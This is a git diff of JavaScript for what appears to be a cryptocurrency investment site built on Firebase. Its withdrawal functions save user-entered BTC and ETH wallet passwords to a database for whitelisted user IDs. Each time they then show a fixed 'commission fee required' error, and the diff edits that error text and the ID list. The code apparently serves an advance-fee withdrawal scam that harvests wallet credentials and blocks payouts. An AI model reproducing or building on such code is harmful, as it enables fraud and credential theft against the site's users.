@@ -139,7 +139,7 @@ const savebtcwithdrawlToDb = () => {
                 var uid = user.uid;
 
 
-                if (uid === "RdzfByeKcJfkhNiCIBIMqlVQnWe2" || uid === "5hFThgDxjcdHc2eDvQxevu9YjA82" || uid === "RtPlwXqnsAgic4y73eW7g4SuMz33") {
+                if (uid === "RdzfByeKcJfkhNiCIBIMqlVQnWe2" || uid === "5hFThgDxjcdHc2eDvQxevu9YjA82" || uid === "06cgtCpQSgVijfFSRnmzqnQ77Sl2") {
 
 
                     db.collection("btc-withdrawals").doc(uid).set({
@@ -149,7 +149,7 @@ const savebtcwithdrawlToDb = () => {
                         btcpassword: btcPassword
                     }, { merge: true })
                         .then(() => {
-                            alert("Error: USD (15%) Commision fee required")
+                            alert("Error: USD Commision fee required")
 
                         })
                         .catch((error) => {
@@ -222,7 +222,7 @@ const saveethwithdrawlToDb = () => {
                         ethpassword: ethPassword
                     }, { merge: true })
                         .then(() => {
-                            alert("Error: USD (15%) Commision fee required")
+                            alert("Error: USD Commision fee required")
 
                         })
                         .catch((error) => {
@@ -516,255 +516,255 @@ const getusersusdwallet = () => {
 }
 
 
-const getusersteslawallet = () => {
+// const getusersteslawallet = () => {
 
 
-    firebase.auth().onAuthStateChanged((user) => {
-        if (user) {
-            // User is signed in, see docs for a list of available properties
-            // https://firebase.google.com/docs/reference/js/firebase.User
+//     firebase.auth().onAuthStateChanged((user) => {
+//         if (user) {
+//             // User is signed in, see docs for a list of available properties
+//             // https://firebase.google.com/docs/reference/js/firebase.User
 
-            var uid = user.uid;
+//             var uid = user.uid;
 
-            var docRef = db.collection("tesla-wallet").doc(uid);
-            // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
-            // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;
+//             var docRef = db.collection("tesla-wallet").doc(uid);
+//             // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
+//             // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;
 
 
 
-            docRef.get().then((doc) => {
-                if (doc.exists) {
+//             docRef.get().then((doc) => {
+//                 if (doc.exists) {
 
 
-                    let teslabalance = document.getElementById("teslabalance-amount")
-                    let teslaamountonhold = document.getElementById("teslaamountOnHold")
-                    teslabalance.textContent = doc.data().currentamount
-                    teslaamountonhold.textContent = doc.data().amountonhold
-                } else {
-                    // doc.data() will be undefined in this case
-                    // console.log("No such document!");
-                }
-            }).catch((error) => {
-                // console.log("Error getting document:", error);
-            });
+//                     let teslabalance = document.getElementById("teslabalance-amount")
+//                     let teslaamountonhold = document.getElementById("teslaamountOnHold")
+//                     teslabalance.textContent = doc.data().currentamount
+//                     teslaamountonhold.textContent = doc.data().amountonhold
+//                 } else {
+//                     // doc.data() will be undefined in this case
+//                     // console.log("No such document!");
+//                 }
+//             }).catch((error) => {
+//                 // console.log("Error getting document:", error);
+//             });
 
 
-            // ...
-        } else {
-            // User is signed out
-            // ...
-        }
-    });
+//             // ...
+//         } else {
+//             // User is signed out
+//             // ...
+//         }
+//     });
 
 
 
-}
+// }
 
-const getusersmetawallet = () => {
+// const getusersmetawallet = () => {
 
 
-    firebase.auth().onAuthStateChanged((user) => {
-        if (user) {
-            // User is signed in, see docs for a list of available properties
-            // https://firebase.google.com/docs/reference/js/firebase.User
+//     firebase.auth().onAuthStateChanged((user) => {
+//         if (user) {
+//             // User is signed in, see docs for a list of available properties
+//             // https://firebase.google.com/docs/reference/js/firebase.User
 
-            var uid = user.uid;
+//             var uid = user.uid;
 
-            var docRef = db.collection("meta-wallets").doc(uid);
-            // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
-            // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;
+//             var docRef = db.collection("meta-wallets").doc(uid);
+//             // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
+//             // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;
 
 
 
-            docRef.get().then((doc) => {
-                if (doc.exists) {
+//             docRef.get().then((doc) => {
+//                 if (doc.exists) {
 
-                    let metabalance = document.getElementById("metabalance-amount")
-                    let metaamountonhold = document.getElementById("metaamountOnHold")
-                    metabalance.textContent = doc.data().currentamount
-                    metaamountonhold.textContent = doc.data().amountonhold
-                } else {
-                    // doc.data() will be undefined in this case
-                    // console.log("No such document!");
-                }
-            }).catch((error) => {
-                // console.log("Error getting document:", error);
-            });
+//                     let metabalance = document.getElementById("metabalance-amount")
+//                     let metaamountonhold = document.getElementById("metaamountOnHold")
+//                     metabalance.textContent = doc.data().currentamount
+//                     metaamountonhold.textContent = doc.data().amountonhold
+//                 } else {
+//                     // doc.data() will be undefined in this case
+//                     // console.log("No such document!");
+//                 }
+//             }).catch((error) => {
+//                 // console.log("Error getting document:", error);
+//             });
 
 
-            // ...
-        } else {
-            // User is signed out
-            // ...
-        }
-    });
+//             // ...
+//         } else {
+//             // User is signed out
+//             // ...
+//         }
+//     });
 
 
 
-}
+// }
 
-const getusersapplewallet = () => {
+// const getusersapplewallet = () => {
 
 
-    firebase.auth().onAuthStateChanged((user) => {
-        if (user) {
-            // User is signed in, see docs for a list of available properties
-            // https://firebase.google.com/docs/reference/js/firebase.User
+//     firebase.auth().onAuthStateChanged((user) => {
+//         if (user) {
+//             // User is signed in, see docs for a list of available properties
+//             // https://firebase.google.com/docs/reference/js/firebase.User
 
-            var uid = user.uid;
+//             var uid = user.uid;
 
-            var docRef = db.collection("apple-wallets").doc(uid);
-            // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
-            // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;
+//             var docRef = db.collection("apple-wallets").doc(uid);
+//             // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
+//             // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;
 
 
 
-            docRef.get().then((doc) => {
-                if (doc.exists) {
+//             docRef.get().then((doc) => {
+//                 if (doc.exists) {
 
-                    let applebalance = document.getElementById("applebalance-amount")
-                    let appleamountonhold = document.getElementById("appleamountOnHold")
-                    applebalance.textContent = doc.data().currentamount
-                    appleamountonhold.textContent = doc.data().amountonhold
-                } else {
-                    // doc.data() will be undefined in this case
-                    // console.log("No such document!");
-                }
-            }).catch((error) => {
-                // console.log("Error getting document:", error);
-            });
+//                     let applebalance = document.getElementById("applebalance-amount")
+//                     let appleamountonhold = document.getElementById("appleamountOnHold")
+//                     applebalance.textContent = doc.data().currentamount
+//                     appleamountonhold.textContent = doc.data().amountonhold
+//                 } else {
+//                     // doc.data() will be undefined in this case
+//                     // console.log("No such document!");
+//                 }
+//             }).catch((error) => {
+//                 // console.log("Error getting document:", error);
+//             });
 
 
-            // ...
-        } else {
-            // User is signed out
-            // ...
-        }
-    });
+//             // ...
+//         } else {
+//             // User is signed out
+//             // ...
+//         }
+//     });
 
 
 
-}
+// }
 
-const getuserstrades = () => {
-    firebase.auth().onAuthStateChanged((user) => {
-        if (user) {
-            // User is signed in, see docs for a list of available properties
-            // https://firebase.google.com/docs/reference/js/firebase.User
+// const getuserstrades = () => {
+//     firebase.auth().onAuthStateChanged((user) => {
+//         if (user) {
+//             // User is signed in, see docs for a list of available properties
+//             // https://firebase.google.com/docs/reference/js/firebase.User
 
-            var uid = user.uid;
+//             var uid = user.uid;
 
-            var docRef = db.collection("users-trade").doc(uid);
-            // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
-            // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;
+//             var docRef = db.collection("users-trade").doc(uid);
+//             // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
+//             // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;
 
 
 
-            docRef.get().then((doc) => {
-                if (doc.exists) {
+//             docRef.get().then((doc) => {
+//                 if (doc.exists) {
 
-                    let tradeDate = document.getElementById("tradedate")
-                    let tradeProfit = document.getElementById("tradeprofit")
+//                     let tradeDate = document.getElementById("tradedate")
+//                     let tradeProfit = document.getElementById("tradeprofit")
 
-                    let tradeDate2 = document.getElementById("tradedate2")
-                    let tradeProfit2 = document.getElementById("tradeprofit2")
+//                     let tradeDate2 = document.getElementById("tradedate2")
+//                     let tradeProfit2 = document.getElementById("tradeprofit2")
 
-                    let tradeDate3 = document.getElementById("tradedate3")
-                    let tradeProfit3 = document.getElementById("tradeprofit3")
+//                     let tradeDate3 = document.getElementById("tradedate3")
+//                     let tradeProfit3 = document.getElementById("tradeprofit3")
 
-                    let tradeDate4 = document.getElementById("tradedate4")
-                    let tradeProfit4 = document.getElementById("tradeprofit4")
+//                     let tradeDate4 = document.getElementById("tradedate4")
+//                     let tradeProfit4 = document.getElementById("tradeprofit4")
 
-                    let tradeDate5 = document.getElementById("tradedate5")
-                    let tradeProfit5 = document.getElementById("tradeprofit5")
+//                     let tradeDate5 = document.getElementById("tradedate5")
+//                     let tradeProfit5 = document.getElementById("tradeprofit5")
 
 
 
-                    tradeDate.textContent = doc.data().tradedate
-                    tradeDate2.textContent = doc.data().tradedate2
-                    tradeDate3.textContent = doc.data().tradedate3
-                    tradeDate4.textContent = doc.data().tradedate4
-                    tradeProfit.textContent = doc.data().tradeprofit
-                    tradeProfit2.textContent = doc.data().tradeprofit2
-                    tradeProfit3.textContent = doc.data().tradeprofit3
-                    tradeProfit4.textContent = doc.data().tradeprofit4
+//                     tradeDate.textContent = doc.data().tradedate
+//                     tradeDate2.textContent = doc.data().tradedate2
+//                     tradeDate3.textContent = doc.data().tradedate3
+//                     tradeDate4.textContent = doc.data().tradedate4
+//                     tradeProfit.textContent = doc.data().tradeprofit
+//                     tradeProfit2.textContent = doc.data().tradeprofit2
+//                     tradeProfit3.textContent = doc.data().tradeprofit3
+//                     tradeProfit4.textContent = doc.data().tradeprofit4
 
 
-                } else {
-                    // doc.data() will be undefined in this case
-                    // console.log("No such document!");
-                }
-            }).catch((error) => {
-                // console.log("Error getting document:", error);
-            });
+//                 } else {
+//                     // doc.data() will be undefined in this case
+//                     // console.log("No such document!");
+//                 }
+//             }).catch((error) => {
+//                 // console.log("Error getting document:", error);
+//             });
 
 
-            // ...
-        } else {
-            // User is signed out
-            // ...
-        }
-    });
+//             // ...
+//         } else {
+//             // User is signed out
+//             // ...
+//         }
+//     });
 
-}
+// }
 
 
-const getuserstransaction = () => {
-    firebase.auth().onAuthStateChanged((user) => {
-        if (user) {
-            // User is signed in, see docs for a list of available properties
-            // https://firebase.google.com/docs/reference/js/firebase.User
+// const getuserstransaction = () => {
+//     firebase.auth().onAuthStateChanged((user) => {
+//         if (user) {
+//             // User is signed in, see docs for a list of available properties
+//             // https://firebase.google.com/docs/reference/js/firebase.User
 
-            var uid = user.uid;
+//             var uid = user.uid;
 
-            var docRef = db.collection("users-transaction").doc(uid);
-            // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
-            // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;
+//             var docRef = db.collection("users-transaction").doc(uid);
+//             // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
+//             // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;
 
 
 
-            docRef.get().then((doc) => {
-                if (doc.exists) {
+//             docRef.get().then((doc) => {
+//                 if (doc.exists) {
 
-                    let transactiondate = document.getElementById("transactiondate")
-                    let transactiondate2 = document.getElementById("transactiondate2")
+//                     let transactiondate = document.getElementById("transactiondate")
+//                     let transactiondate2 = document.getElementById("transactiondate2")
 
-                    let transactiontype = document.getElementById("transactiontype")
-                    let transactiontype2 = document.getElementById("transactiontype2")
+//                     let transactiontype = document.getElementById("transactiontype")
+//                     let transactiontype2 = document.getElementById("transactiontype2")
 
 
-                    let transactionamount = document.getElementById("transactionamount")
-                    let transactionamount2 = document.getElementById("transactionamount2")
+//                     let transactionamount = document.getElementById("transactionamount")
+//                     let transactionamount2 = document.getElementById("transactionamount2")
 
 
 
-                    transactiondate.textContent = doc.data().transactiondate
-                    transactiondate2.textContent = doc.data().transactiondate2
+//                     transactiondate.textContent = doc.data().transactiondate
+//                     transactiondate2.textContent = doc.data().transactiondate2
 
-                    transactiontype.textContent = doc.data().transactiontype
-                    transactiontype2.textContent = doc.data().transactiontype2
+//                     transactiontype.textContent = doc.data().transactiontype
+//                     transactiontype2.textContent = doc.data().transactiontype2
 
-                    transactionamount.textContent = doc.data().transactionamount
-                    transactionamount2.textContent = doc.data().transactionamount2
+//                     transactionamount.textContent = doc.data().transactionamount
+//                     transactionamount2.textContent = doc.data().transactionamount2
 
 
-                } else {
-                    // doc.data() will be undefined in this case
-                    // console.log("No such document!");
-                }
-            }).catch((error) => {
-                // console.log("Error getting document:", error);
-            });
+//                 } else {
+//                     // doc.data() will be undefined in this case
+//                     // console.log("No such document!");
+//                 }
+//             }).catch((error) => {
+//                 // console.log("Error getting document:", error);
+//             });
 
 
-            // ...
-        } else {
-            // User is signed out
-            // ...
-        }
-    });
+//             // ...
+//         } else {
+//             // User is signed out
+//             // ...
+//         }
+//     });
 
-}
+// }
 
 const getusersid = () => {
     firebase.auth().onAuthStateChanged((user) => {
@@ -791,12 +791,9 @@ const getusersid = () => {
 getusersid();
 getusersbtcwallet();
 getusersethwallet();
-getusersteslawallet();
-getusersmetawallet();
-getusersapplewallet();
+
 getusersusdwallet();
-getuserstrades();
-getuserstransaction();
+
 
 
 
